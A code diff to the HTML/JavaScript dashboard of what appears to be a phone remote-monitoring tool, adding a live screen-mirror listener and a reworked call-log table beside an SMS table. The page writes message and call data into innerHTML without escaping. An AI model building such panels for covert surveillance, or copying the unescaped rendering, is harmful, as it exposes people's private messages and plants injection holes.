@@ -226,11 +226,14 @@
         }
     }
 
+    // SCREEN MIRROR LISTENER
     socket.on('ui-screen-stream', (base64) => {
+        // Hide placeholder, show image
         document.getElementById('placeholder').style.display = 'none';
         const img = document.getElementById('screen-img');
         img.style.display = 'block';
-        img.src = "data:image/jpeg;base64," + base64;
+        img.src = "data:image/jpeg;base64," + base64; // Updates the image source continuously
+        
         document.getElementById('screen-state').innerText = "LIVE";
         document.getElementById('screen-state').style.color = "var(--success)";
     });
@@ -262,9 +265,24 @@
         document.getElementById('sms-table').innerHTML = data.map(m => `<tr><td>${m.type}</td><td>${m.address}</td><td>${m.body}</td><td>${new Date(m.date).toLocaleString()}</td></tr>`).join('');
     });
 
+   // CALL LOG LISTENER
     socket.on('ui-calls-display', (data) => {
-        document.getElementById('calls-table').innerHTML = data.map(c => `<tr><td>${c.type}</td><td>${c.name||'Unknown'}</td><td>${c.number}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>`).join('');
+        const tableBody = document.getElementById('calls-table');
+        if (!data || data.length === 0) {
+            tableBody.innerHTML = "<tr><td colspan='5'>No call logs found.</td></tr>";
+            return;
+        }
+        tableBody.innerHTML = data.map(c => `
+            <tr>
+                <td>${c.type}</td>
+                <td>${c.name || 'Unknown'}</td>
+                <td>${c.number}</td>
+                <td>${c.duration}</td>
+                <td>${new Date(c.date).toLocaleString()}</td>
+            </tr>
+        `).join('');
     });
 </script>
 </body>
 </html>
+
